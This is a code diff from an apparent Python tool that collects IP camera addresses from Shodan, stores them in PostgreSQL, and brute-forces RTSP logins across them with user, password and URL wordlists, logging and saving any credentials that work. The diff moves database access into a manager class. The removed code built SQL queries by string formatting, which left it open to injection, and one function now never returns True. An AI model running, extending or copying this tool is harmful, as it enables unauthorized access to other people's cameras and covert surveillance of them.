@@ -17,6 +17,8 @@ from shodan.helpers import get_screenshot
 
 __version__ = '0.1.0'
 
+from models.managers import CameraManager
+
 load_dotenv()
 
 logging.basicConfig(
@@ -40,83 +42,7 @@ class Singleton(type):
         return cls._instances[cls]
 
 
-class DatabaseConnector(metaclass=Singleton):
-
-    def __init__(self):
-        try:
-            self.conn = psycopg2.connect(
-                database=os.getenv('DB_NAME'),
-                host=os.getenv('DB_HOST'),
-                user=os.getenv('DB_USER'),
-                password=os.getenv('DB_PASSWORD'),
-                port=os.getenv('DB_PORT')
-            )
-            logging.info(f'Connected to {os.getenv("DB_NAME")} database')
-        except Exception as e:
-            logging.error(f'Error on connect to database: {e}')
-            raise e
-
-    def insert_into_cameras(self, ip, port, user, password, url, city, country_code, country_name, region_code):
-        city = city.replace("'", "").replace('"', '').replace(';', '')
-        c = self.conn.cursor()
-        c.execute(f'''
-            INSERT INTO public.cameras (ip, port, "user", "password", url, active, city, country_code, country_name, region_code, added_at, updated_at, id) VALUES('{ip}', {port}, '{user}', '{password}', '{url}', 0, '{city}', '{country_code}, {country_name}, {region_code}', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, DEFAULT);
-        '''.strip())
-        self.conn.commit()
-
-    def insert_into_runs(self, run_name):
-        c = self.conn.cursor()
-        c.execute('''
-            INSERT INTO runs(run_name) VALUES(%s)
-        '''.strip(), (run_name,))
-        self.conn.commit()
-
-    def get_random_from_db(self):
-        c = self.conn.cursor()
-        c.execute('''
-            SELECT * FROM cameras WHERE active = 0 ORDER BY RANDOM()
-        '''.strip())
-        result = c.fetchall()
-        return result
-
-    def get_from_db(self):
-        c = self.conn.cursor()
-        c.execute('''
-            SELECT * FROM cameras WHERE active = 0
-        '''.strip())
-        result = c.fetchall()
-        return result
-
-    def search_on_db(self, ip, port):
-        c = self.conn.cursor()
-        c.execute(f'''SELECT * FROM cameras WHERE ip = '{ip}' AND port = {port}''')
-        result = c.fetchall()
-        return result
-
-    def update_active_from_db(self, ip, port):
-        c = self.conn.cursor()
-        c.execute(f'''UPDATE cameras SET active = 1 WHERE ip = '{ip}' AND port = {port}'''.strip())
-        self.conn.commit()
-
-    def update_from_db_values(self, host, port, user, password, rtsp_string, active):
-        c = self.conn.cursor()
-        query = f'''
-            INSERT INTO cameras (ip, port, "user", password, url, active, updated_at)
-            VALUES ('{host}', {port}, '{user}', '{password}', '{rtsp_string}', {active}, CURRENT_TIMESTAMP)
-            ON CONFLICT (ip, port)
-            DO UPDATE SET
-                "user" = EXCLUDED."user",
-                password = EXCLUDED.password,
-                url = EXCLUDED.url,
-                active = EXCLUDED.active,
-                updated_at = EXCLUDED.updated_at;
-            '''.strip()
-        c.execute(query)
-        self.conn.commit()
-        logging.debug(f'Updated {host}:{port} with {user}:{password} and {rtsp_string}')
-
-
-db = DatabaseConnector()
+cam_db = CameraManager()
 
 
 def write_image_to_file(ss, h, p):
@@ -129,14 +55,14 @@ def write_image_to_file(ss, h, p):
 def check_rtsp_connection_by_host(host, port, user, password, rtsp_string):
     rtsp_url = rtsp_string.format(user, password, host, port)
     logging.debug(f'{rtsp_url}')
-    vcap = cv2.VideoCapture(0)
+    vcap = cv2.VideoCapture(rtsp_url)
     try:
         ret, frame = vcap.read()
         if not ret:
             logging.debug(f'No frame for {rtsp_url}')
             return None
         logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}, user: {user}, password: {password}')
-        db.update_from_db_values(host, port, user, password, rtsp_url, 1)
+        cam_db.update_from_db_values(host, port, user, password, rtsp_url, 1)
         return rtsp_url
     except Exception as e:
         logging.error(f'Error: {e}')
@@ -157,7 +83,7 @@ def check_rtsp_connection(host, port, rtsp_string):
             logging.debug(f'No frame for {rtsp_url}')
             return None
         logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}')
-        db.update_from_db_values(host, port, None, None, rtsp_url, 1)
+        cam_db.update_from_db_values(host, port, None, None, rtsp_url, 1)
         return rtsp_url
     except Exception as e:
         logging.error(f'Error: {e}')
@@ -175,8 +101,7 @@ def is_camera(host, port, path):
         sock.send(f'GET {path} HTTP/1.0\r\n\r\n'.encode())
         res = sock.recv(100)
         if res.find(b'200 OK') > 0:
-            db.update_active_from_db(host, port)
-            return True
+            cam_db.update_active_from_db(host, port)
         return False
     except Exception as e:
         return False
@@ -203,7 +128,7 @@ def thread_add_cameras_on_db(shodan_key=None):
             with open(f'banner/{banner.get("ip_str")}_{banner.get("port")}.json', 'w') as f:
                 f.write(json.dumps(banner, indent=4))
             ip, port = banner.get('ip_str'), banner.get('port')
-            db_response = db.search_on_db(ip, port)
+            db_response = cam_db.search_on_db(ip, port)
             if db_response:
                 logging.debug(f'{ip}:{port} skipped')
             else:
@@ -211,7 +136,7 @@ def thread_add_cameras_on_db(shodan_key=None):
                 country_code = banner.get('location').get('country_code')
                 country_name = banner.get('location').get('country_name')
                 region_code = banner.get('location').get('region_code')
-                db.insert_into_cameras(ip, port, '.', '.', '.', city, country_code, country_name, region_code)
+                cam_db.insert_into_cameras(ip, port, '.', '.', '.', city, country_code, country_name, region_code)
                 logging.debug(f'{ip}:{port} added')
                 cams_added += 1
             if banner.get('screenshot'):
@@ -239,11 +164,12 @@ def thread_test_cameras(users_wordlist, passwords_wordlist, rtsp_urls_wordlist, 
         random.shuffle(camera_passwords)
         random.shuffle(rtsp_url_type)
 
-    cameras = db.get_random_from_db()
+    cameras = cam_db.get_random_from_db()
     logging.debug(f'Testing {len(cameras)} cameras')
     camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
     for url, user, password, camera in camera_combinations:
-        ip, port = camera[0], camera[1]
+        ip = camera.ip
+        port = camera.port
         url_login = url.format(user, password, ip, port)
         check_rtsp_connection_by_host(ip, port, user, password, url_login)
     logging.info(f'Executors: finished in thread_test_cameras')
